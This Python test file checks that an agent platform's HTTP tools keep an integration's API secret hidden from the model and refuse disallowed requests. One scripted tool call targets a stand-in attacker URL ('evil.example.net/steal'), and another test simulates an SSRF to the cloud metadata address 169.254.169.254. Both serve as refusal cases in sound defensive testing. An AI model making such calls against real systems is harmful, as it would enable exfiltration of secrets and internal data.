"""The HTTP tools inside a real run: real database, vault and API; a scripted model; a local server.

The point of these tests: an agent can use an integration's secret without ever being able to see
it, and every failure (disabled, deleted, wrong host, no key) ends in a clear tool error.
"""

import json
import uuid
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from app.core.config import get_settings
from app.core.vault import generate_key
from app.engine.executor import execute_run
from app.models.enums import IntegrationProvider
from app.tools import http as http_tools
from app.tools.base import ToolError
from app.tools.integration_access import DatabaseIntegrationAccess
from tests.fakes import ScriptedLLM, call_tools, reply
from tests.integration.engine_helpers import ADMIN, Queue, Workspace
from tests.tls_server import LocalHttpsServer, Reply, Seen, local_fetcher

Maker = async_sessionmaker[AsyncSession]

HOST = "api.example.com"
SECRET = "sk-live-ENGINE-SECRET-777"


@pytest.fixture(autouse=True)
def _ai_configured(gemini_key: None, queue: Queue, vault_key: str) -> None:
    """Every test here has a (fake) model key, a recorder instead of Celery, and a vault key."""


@pytest.fixture
async def server(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> AsyncIterator[LocalHttpsServer]:
    local = LocalHttpsServer(tmp_path)
    await local.start()
    monkeypatch.setattr(http_tools, "new_fetcher", lambda: local_fetcher(local))
    yield local
    await local.stop()


async def make_integration(
    ws: Workspace,
    *,
    hosts: tuple[str, ...] = (HOST,),
    secret: str | None = SECRET,
    name: str = "Weather API",
) -> str:
    response = await ws.api.post(
        ADMIN,
        f"{ws.base}/integrations",
        json={"provider": "http", "name": name, "config": {"allowed_hosts": list(hosts)}},
    )
    assert response.status_code == 201, response.text
    integration_id = str(response.json()["id"])
    if secret is not None:
        saved = await ws.api.request(
            ADMIN,
            "PUT",
            f"{ws.base}/integrations/{integration_id}/credential",
            json={"secret": secret},
        )
        assert saved.status_code == 200, saved.text
    return integration_id


async def run_agent(
    ws: Workspace, maker: Maker, llm: ScriptedLLM, tools: list[dict[str, Any]]
) -> dict[str, Any]:
    agent_id = await ws.create_agent(tools=tools)
    run_id = await ws.new_run(agent_id, "Check the weather")
    await execute_run(uuid.UUID(run_id), uuid.UUID(ws.org_id), maker=maker, llm=llm)
    return await ws.detail(run_id)


def grant(integration_id: str, key: str = "http.get") -> dict[str, Any]:
    return {"tool_key": key, "config": {"integration_id": integration_id}}


def tool_step(run: dict[str, Any]) -> dict[str, Any]:
    (step,) = [s for s in run["steps"] if s["step_type"] == "tool_call"]
    found: dict[str, Any] = step
    return found


def get_call(path: str = "/weather") -> tuple[str, dict[str, Any]]:
    return ("http_get", {"url": f"https://{HOST}{path}"})


# ---------- it works, and the model never sees the secret ----------


async def test_an_agent_calls_an_api_with_the_integrations_secret(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    server.on("/weather", Reply(body='{"city": "Nairobi", "temp_c": 21}'))
    integration_id = await make_integration(workspace)
    llm = ScriptedLLM(call_tools(get_call("/weather?city=Nairobi")), reply("It is 21 degrees."))

    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id)])

    assert run["status"] == "succeeded" and run["output"]["text"] == "It is 21 degrees."
    step = tool_step(run)
    assert step["status"] == "succeeded" and step["tool_key"] == "http.get"
    assert step["input"] == {"url": f"https://{HOST}/weather?city=Nairobi"}
    assert step["output"]["status"] == 200
    assert json.loads(step["output"]["body"]) == {"city": "Nairobi", "temp_c": 21}

    # The server received the secret, sent by the platform...
    (seen,) = server.seen
    assert seen.headers["authorization"] == f"Bearer {SECRET}" and seen.host == HOST
    # ...but it appears nowhere the agent, the model, the run record or an admin can look.
    assert SECRET not in json.dumps(run)
    assert SECRET not in json.dumps(llm.requests, default=str)
    answer = llm.requests[1]["messages"][-1]["results"][0]
    assert answer["is_error"] is False and "Nairobi" in answer["content"]


async def test_a_secret_echoed_by_the_server_never_reaches_the_model_or_the_record(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    def echo(seen: Seen) -> Reply:
        return Reply(body=json.dumps({"debug": seen.headers["authorization"]}))

    server.on("/debug", echo)
    integration_id = await make_integration(workspace)
    llm = ScriptedLLM(call_tools(get_call("/debug")), reply("done"))

    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id)])

    assert run["status"] == "succeeded"
    assert SECRET not in json.dumps(run)
    assert SECRET not in json.dumps(llm.requests, default=str)
    assert "[redacted]" in tool_step(run)["output"]["body"]


async def test_an_integration_without_a_secret_still_works(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    server.on("/public", Reply(body='{"open": true}'))
    integration_id = await make_integration(workspace, secret=None)
    llm = ScriptedLLM(call_tools(get_call("/public")), reply("ok"))
    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id)])
    assert tool_step(run)["status"] == "succeeded"
    assert "authorization" not in server.seen[0].headers


# ---------- what is refused, and how it is reported ----------


async def test_a_host_the_admin_did_not_list_is_refused(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    integration_id = await make_integration(workspace)
    llm = ScriptedLLM(
        call_tools(("http_get", {"url": "https://evil.example.net/steal"})), reply("sorry")
    )
    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id)])
    step = tool_step(run)
    assert step["status"] == "failed" and "not allowed by this integration" in step["error"]
    assert server.seen == []
    assert llm.requests[1]["messages"][-1]["results"][0]["is_error"] is True
    assert run["status"] == "succeeded"  # the agent carried on and answered


async def test_the_platform_blocks_a_listed_host_that_points_inside(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer, monkeypatch: Any
) -> None:
    """Even an admin-listed name is not called if it resolves to a private address."""
    from app.tools.http import HttpFetcher
    from app.tools.netsafety import SafeNetworkBackend

    async def points_at_metadata(host: str, port: int) -> list[str]:
        return ["169.254.169.254"]

    backend = SafeNetworkBackend(resolver=points_at_metadata, port_override=server.port)
    monkeypatch.setattr(http_tools, "new_fetcher", lambda: HttpFetcher(backend=backend))
    integration_id = await make_integration(workspace)
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id)])
    step = tool_step(run)
    assert step["status"] == "failed" and "public internet address" in step["error"]
    assert server.seen == []


async def test_a_disabled_integration_stops_the_tool(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    integration_id = await make_integration(workspace)
    agent_id = await workspace.create_agent(tools=[grant(integration_id)])
    await workspace.api.patch(
        ADMIN, f"{workspace.base}/integrations/{integration_id}", json={"status": "disabled"}
    )
    run_id = await workspace.new_run(agent_id)
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    await execute_run(uuid.UUID(run_id), uuid.UUID(workspace.org_id), maker=runtime_maker, llm=llm)
    step = tool_step(await workspace.detail(run_id))
    assert step["status"] == "failed" and "is disabled" in step["error"]
    assert server.seen == []


async def test_a_deleted_integration_stops_the_tool(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    integration_id = await make_integration(workspace)
    agent_id = await workspace.create_agent(tools=[grant(integration_id)])
    await workspace.api.delete(ADMIN, f"{workspace.base}/integrations/{integration_id}")
    run_id = await workspace.new_run(agent_id)
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    await execute_run(uuid.UUID(run_id), uuid.UUID(workspace.org_id), maker=runtime_maker, llm=llm)
    step = tool_step(await workspace.detail(run_id))
    assert step["status"] == "failed" and "no longer exists" in step["error"]
    assert server.seen == []


async def test_editing_the_allowed_hosts_takes_effect_on_saved_agents(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    server.on("/weather", Reply(body="{}"))
    integration_id = await make_integration(workspace)
    agent_id = await workspace.create_agent(tools=[grant(integration_id)])
    await workspace.api.patch(
        ADMIN,
        f"{workspace.base}/integrations/{integration_id}",
        json={"config": {"allowed_hosts": ["other.example.com"]}},
    )
    run_id = await workspace.new_run(agent_id)
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    await execute_run(uuid.UUID(run_id), uuid.UUID(workspace.org_id), maker=runtime_maker, llm=llm)
    step = tool_step(await workspace.detail(run_id))
    assert step["status"] == "failed" and "not allowed" in step["error"]
    assert server.seen == []


async def test_a_write_tool_waits_for_approvals_and_sends_nothing(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    """http.request always needs approval, and approvals arrive in a later step: until then the
    request is skipped, never sent."""
    server.on("/orders", Reply(status=201, body="{}"))
    integration_id = await make_integration(workspace)
    llm = ScriptedLLM(
        call_tools(
            (
                "http_request",
                {"method": "POST", "url": f"https://{HOST}/orders", "body": '{"qty": 1}'},
            )
        ),
        reply("I could not place the order."),
    )
    run = await run_agent(workspace, runtime_maker, llm, [grant(integration_id, "http.request")])
    step = tool_step(run)
    assert step["status"] == "skipped" and "approval" in step["error"]
    assert server.seen == []


async def test_an_agent_cannot_reach_a_different_integrations_hosts(
    workspace: Workspace, runtime_maker: Maker, server: LocalHttpsServer
) -> None:
    """Each grant is tied to one integration: another one's host list does not apply."""
    mine = await make_integration(workspace, hosts=("other.example.com",), name="Mine")
    await make_integration(workspace, hosts=(HOST,), name="Theirs")
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    run = await run_agent(workspace, runtime_maker, llm, [grant(mine)])
    assert "not allowed by this integration" in tool_step(run)["error"]
    assert server.seen == []


# ---------- the vault, at the moment of use ----------


async def test_no_encryption_key_at_run_time_is_reported_without_leaking(
    workspace: Workspace,
    runtime_maker: Maker,
    server: LocalHttpsServer,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    integration_id = await make_integration(workspace)
    agent_id = await workspace.create_agent(tools=[grant(integration_id)])
    run_id = await workspace.new_run(agent_id)
    monkeypatch.delenv("CREDENTIAL_ENCRYPTION_KEY")
    get_settings.cache_clear()
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    await execute_run(uuid.UUID(run_id), uuid.UUID(workspace.org_id), maker=runtime_maker, llm=llm)
    run = await workspace.detail(run_id)
    assert "no encryption key" in tool_step(run)["error"]
    assert SECRET not in json.dumps(run) and server.seen == []


async def test_a_changed_key_is_reported_as_an_unusable_secret(
    workspace: Workspace,
    runtime_maker: Maker,
    server: LocalHttpsServer,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    integration_id = await make_integration(workspace)
    agent_id = await workspace.create_agent(tools=[grant(integration_id)])
    run_id = await workspace.new_run(agent_id)
    monkeypatch.setenv("CREDENTIAL_ENCRYPTION_KEY", generate_key())
    get_settings.cache_clear()
    llm = ScriptedLLM(call_tools(get_call()), reply("ok"))
    await execute_run(uuid.UUID(run_id), uuid.UUID(workspace.org_id), maker=runtime_maker, llm=llm)
    run = await workspace.detail(run_id)
    step = tool_step(run)
    assert step["status"] == "failed" and "could not be used" in step["error"]
    assert "save it again" in step["error"]
    assert SECRET not in json.dumps(run) and server.seen == []


# ---------- how handlers reach an integration ----------


async def resolve(maker: Maker, ws: Workspace, integration_id: object) -> Any:
    access = DatabaseIntegrationAccess(maker, uuid.UUID(ws.org_id))
    return await access.resolve(integration_id, IntegrationProvider.HTTP)


async def test_resolving_returns_settings_and_the_decrypted_secret(
    workspace: Workspace, runtime_maker: Maker
) -> None:
    integration_id = await make_integration(workspace)
    resolved = await resolve(runtime_maker, workspace, integration_id)
    assert resolved.secret == SECRET and resolved.config["allowed_hosts"] == [HOST]
    assert SECRET not in repr(resolved)


@pytest.mark.parametrize("bad", [None, "", "not-a-uuid", 5])
async def test_a_missing_or_malformed_integration_id_is_a_clear_error(
    workspace: Workspace, runtime_maker: Maker, bad: object
) -> None:
    with pytest.raises(ToolError, match="not connected to an integration"):
        await resolve(runtime_maker, workspace, bad)


async def test_the_wrong_type_of_integration_is_refused(
    workspace: Workspace, runtime_maker: Maker
) -> None:
    slack = await workspace.api.post(
        ADMIN,
        f"{workspace.base}/integrations",
        json={"provider": "slack", "name": "Team Slack", "config": {}},
    )
    with pytest.raises(ToolError, match="not the right type"):
        await resolve(runtime_maker, workspace, slack.json()["id"])


async def test_another_organizations_integration_looks_like_it_does_not_exist(
    workspace: Workspace, runtime_maker: Maker
) -> None:
    theirs = await workspace.api.post(
        "stranger@other.example.com",
        f"/api/v1/organizations/{workspace.other_org_id}/integrations",
        json={"provider": "http", "name": "Theirs", "config": {"allowed_hosts": [HOST]}},
    )
    with pytest.raises(ToolError, match="no longer exists"):
        await resolve(runtime_maker, workspace, theirs.json()["id"])
